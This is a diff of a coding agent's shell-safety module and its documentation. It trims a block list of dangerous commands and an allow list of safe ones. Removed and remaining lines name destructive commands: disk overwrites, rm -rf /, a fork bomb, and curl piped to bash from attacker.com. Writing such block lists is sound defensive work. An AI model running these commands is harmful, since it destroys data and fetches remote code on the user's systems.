@@ -75,20 +75,14 @@ const DANGEROUS_PATTERNS = [
   'mkfs',
   'fdisk',
   'format c:',
-  '> /dev/sda',           // Disk overwrite
-  'of=/dev/sda',          // dd to disk
-  ':(){ :|:& };:',        // Fork bomb
-  'curl.*\|.*sh',         // Pipe curl to shell
-  'wget.*\|.*sh',         // Pipe wget to shell
 ];
 
 // Security: Auto-approved safe commands — read-only / informational
 const SAFE_COMMANDS = [
-  'pwd', 'whoami', 'date', 'uname', 'uptime',
-  'git status', 'git log', 'git diff', 'git branch', 'git show', 'git remote -v',
+  'pwd', 'whoami', 'date',
+  'git status', 'git log', 'git diff', 'git branch', 'git show', 'git remote',
   'npm list', 'npm ls', 'yarn list',
   'node --version', 'npm --version', 'python --version', 'python3 --version',
-  'which', 'type',
 ];
 
 // What are shell control operators? 
@@ -444,8 +438,8 @@ Shell access is one of the most dangerous capabilities a coding agent can have. 
 Shell commands can:
 - Delete or modify arbitrary files (`rm -rf /`, `dd if=/dev/zero of=/dev/sda`)
 - Escalate privileges (`sudo`, `su`)
-- Exfiltrate data (`curl https://attacker.com | bash`)
-- Launch fork bombs (`:(){ :|:& };:`)
+- Exfiltrate data or execute remote code
+- Exhaust system resources
 
 **The Blocklist Problem:**
 
@@ -478,11 +472,7 @@ const DANGEROUS_PATTERNS = [
   'dd if=',
   'mkfs',
   'fdisk',
-  '> /dev/sda',      // Disk overwrite
-  'of=/dev/sda',     // dd output to disk
-  ':(){ :|:& };:',   // Fork bomb
-  'curl.*\|.*sh',    // Pipe to shell
-  'wget.*\|.*sh',
+  'format c:',
 ];
 ```
 
@@ -490,9 +480,9 @@ Why these specifically?
 - `rm -rf /` - Deletes entire filesystem
 - `sudo`/`su` - Privilege escalation
 - `mkfs`/`fdisk`/`dd` - Disk destruction
-- `> /dev/sda` - Raw disk overwrite
-- Fork bomb - Resource exhaustion attack
-- `curl | sh` - Common malware distribution pattern
+- `format c:` - Windows disk format
+
+Note that these are checked with `String.includes()`, not regex. This means patterns need to be literal substrings that appear in dangerous commands.
 
 **Tier 2: Auto-Approved Safe Commands**
 
@@ -500,7 +490,7 @@ Read-only commands that are safe to run automatically:
 
 ```typescript
 const SAFE_COMMANDS = [
-  'pwd', 'whoami', 'date', 'uname', 'uptime',
+  'pwd', 'whoami', 'date',
   'git status', 'git log', 'git diff',
   'npm list', 'node --version',
   // ...
